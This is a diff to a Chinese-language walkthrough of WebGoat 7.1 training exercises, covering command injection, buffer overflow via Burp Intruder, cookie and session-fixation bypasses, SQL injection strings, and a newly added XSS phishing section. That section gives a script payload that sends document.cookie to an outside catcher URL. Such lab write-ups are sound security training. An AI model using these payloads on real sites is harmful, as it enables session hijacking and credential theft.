@@ -10,6 +10,15 @@
 
 ## WebGoat 7.1
 
+### 目录
+
+- [命令注入](#命令注入)
+- [未验证用户的输入](#未验证用户的输入)
+- [缓冲区溢出](#缓冲区溢出)
+- [XXE](#xxe)
+- [脆弱的访问控制](#脆弱的访问控制---session-management-flaws)
+- [SQL注入](#sql-注入)
+
 ### 命令注入
 
 #### Command Injection
@@ -59,7 +68,7 @@
 
 - 这道题的题目设计有点令人震惊, 课程的源代码里直接是`if(param3.length() > 4096)`(param3是其中一个输入参数), 只要长度够了就可以获得答案。~~原来这就是缓冲区溢出漏洞啊！~~
 - 第一步, 随意输入字符串:<br>
-<img width="400" alt="随意输入字符串" src="img/buffer-overflows-step-1.jpg"/>
+  <img width="400" alt="随意输入字符串" src="img/buffer-overflows-step-1.jpg"/>
 
 - 第二步, 提交并使用`BurpSuite`拦截, 将拦截的消息发送至`Intruder`。在`Positions`选项卡, 攻击类型选择`Sniper`, 参数只标记`room_no`对应源码中的`param3`
 ![攻击方式选择与参数标记](img/buffer-overflows-step-2.jpg)
@@ -70,7 +79,7 @@
 #### 漏洞分析及修复方法
 
 - 缓冲区溢出常与`C/C++`相关, 他们不自动检查输入数组的数据是否在数组边界内, 特别是`strcpy`等函数, 超出数组范围的数据将强制覆盖正常的数据并导致运行时错误。黑客还可以通过缓冲区溢出来强制用户执行指定位置的程序。<br>
-<img width="400" alt="溢出覆盖" src="img/return-error.jpg">
+  <img width="400" alt="溢出覆盖" src="img/return-error.jpg">
 
 - 可以进行边界检查, 但需要额外的代码和处理时间。现代操作系统常用随机化内存布局的方式(这样每次运行时, 函数在内存的位置都无法确定)来抵抗缓冲区溢出攻击, 或者在缓冲区之间留出空间并寻找写入这些区域的操作
 
@@ -113,7 +122,7 @@
 
 - 浏览器通过`Cookie`来标识用户身份, 未设置`HttpOnly`的网页或不支持`HttpOnly`的浏览器可以通过前端脚本访问和修改`Cookie`从而绕过登录
 - 本题先分别登录`webgoat`和`aspect`两个账户, 可以看到都有一个`AuthCookie`字段, 是用来区分身份的`Cookie`
-  
+
   | User | AuthCookie |
   | - | - |
   | webgoat | 65432ubphcfx |
@@ -134,7 +143,7 @@
 #### Session Fixation
 
 - 将攻击者的`SID`附在链接后面, 受害者点击链接后登录会携带该`SID`: <br>
-<img width="400" alt="添加SID" src="img/add-an-sid.jpg"/>
+  <img width="400" alt="添加SID" src="img/add-an-sid.jpg"/>
 
 - 受害者点击邮件链接并正常登录, `POST`请求携带有攻击者提供的`SID`: <br>
 ![携带攻击者提供的SID](img/with-evil-sid.jpg)
@@ -161,6 +170,15 @@
 #### String SQL Injection
 
 - 与`Numeric SQL Injection`是类似的, 只是多了引号, `Smith' or true --`/`Smith' or '1'='1`即可(有很多方法来匹配引号)
+
+### XSS
+
+#### Phishing with XSS
+
+- 题目要求将用户凭据发送到指定的网址
+- 服务器并未对用户输入进行任何加工
+- 使用`<script>document.write('<img src=http://192.168.56.9:8087/WebGoat/catcher?PROPERTY=yes?'+document.cookie+'  "/>');</script>`就可以完成将`Cookie`发送给服务器的操作
+- 参考答案的做法比较复杂，先是编写了一个`HTML`表单，提交后，受害者会在表单填写数据并提交，拦截受害者发送的数据，转发到指定网址
 
 ## Juice Shop
 
